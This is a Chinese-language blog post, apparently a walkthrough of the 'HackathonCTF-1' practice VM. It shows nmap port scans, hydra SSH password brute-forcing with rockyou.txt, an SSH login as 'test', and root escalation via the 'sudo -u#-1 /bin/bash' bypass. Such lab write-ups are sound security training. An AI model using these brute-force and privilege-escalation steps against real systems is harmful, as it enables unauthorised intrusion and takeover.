+++
title = "HackathonCTF-1 靶机"
date = 2026-06-15T20:20:13+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
开放21，23，80，7223端口  
  

```
c┌──(root㉿kali)-/home/kali/桌面]└─# nmap -p- 61.139.2.134  Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 08:55 ESTNmap scan report for 61.139.2.134Host is up (0.00072s latency).Not shown: 65531 closed tcp ports (reset)PORT     STATE SERVICE21/tcp   open  ftp23/tcp   open  telnet80/tcp   open  http7223/tcp open  unknownMAC Address: 00:0C:29:FA:24:A1 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.66 seconds
```

[  
  
看一下80端口，发现有一个robots.txt  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118214914232.png)  
这里我们进行解密，发现有一个东西  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118214943933.png)  
  
解密完成后发现是这样  
  
ssh-bruteforce-sudoit  
  
发现需要我们对那个ssh端口进行爆破处理，接下来我们进行对7223端口进行识别探测  
  
nmap -sV -p 7223 61.139.2.134  
  

```
c┌──(root㉿kali)-/home/kali/桌面]└─# nmap -sV -p 7223 61.139.2.134Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 08:56 ESTNmap scan report for 61.139.2.134Host is up (0.00047s latency).PORT     STATE SERVICE VERSION7223/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)MAC Address: 00:0C:29:FA:24:A1 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

[  
  
发现还真是ssh端口  
  
然后结合之前的提示进行用户名枚举进行爆破  
  

```
chydra -l sudoit -P /usr/share/wordlists/rockyou.txt ssh://61.139.2.134:7223 -t 4 -vV
```

  
  
在这个爆破的时候，我们回过头来看这个robots.txt里面的内容  
  
发现这个是不加html的目录  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118222234122.png)  
  
  
解密一下，说要用rockyou.txt大字典  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118222316840.png)  
  
访问这个sudo.html 发现这个是test的用户名  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118222410283.png)  
  
  
同时已经爆出了用户名和密码  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118222522951.png)  
  
我们来登录看看,成功登录  
  
  

```
c┌──(root㉿kali)-/home/kali/桌面]└─# ssh test@61.139.2.134 -p 7223The authenticity of host '[61.139.2.134]:7223 ([61.139.2.134]:7223)' can't be established.ED25519 key fingerprint is SHA256:5rYzvIM74WtDvpXcOoCL+yip49t4lsCLAPqvXFn61PM.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[61.139.2.134]:7223' (ED25519) to the list of known hosts.test@61.139.2.134's password: Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64) * Documentation:  https://help.ubuntu.com/Last login: Mon Oct 26 23:54:45 2020test@ctf:~$ iduid=1001(test) gid=1001(test) groups=1001(test)test@ctf:~$
```

[  
  
  
这里提权sudo -l可以用 但是被禁用了  
  
翻看历史命令，我们找到了这个提权的命令  
  
  
  
  
sudo -u#-1 /bin/bash  
  
![](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118224321336.png)